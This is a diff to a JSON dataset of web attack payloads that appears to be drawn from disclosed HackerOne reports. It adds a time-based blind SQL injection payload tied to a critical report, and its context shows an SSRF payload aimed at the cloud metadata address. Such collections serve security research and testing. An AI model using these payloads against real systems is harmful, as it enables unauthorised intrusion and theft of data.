@@ -27370,6 +27370,23 @@
     }
   },
   {
+    "id": "4ab510cb",
+    "class": "sqli",
+    "payload": "1) OR SLEEP(3)-- -",
+    "technique": "time-based blind SQL injection using SLEEP()",
+    "param": null,
+    "report": {
+      "id": 3873072,
+      "url": "https://hackerone.com/reports/3873072",
+      "title": "Unauthenticated SQL Injection via REST Batch Route Confusion \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588",
+      "program": "Essity",
+      "reporter": "matty69v",
+      "severity": "critical",
+      "bounty": null,
+      "disclosed_at": "2026-07-21"
+    }
+  },
+  {
     "id": "d05ba2d2",
     "class": "ssrf",
     "payload": "http:///169.254.169.254/latest/meta-data/",
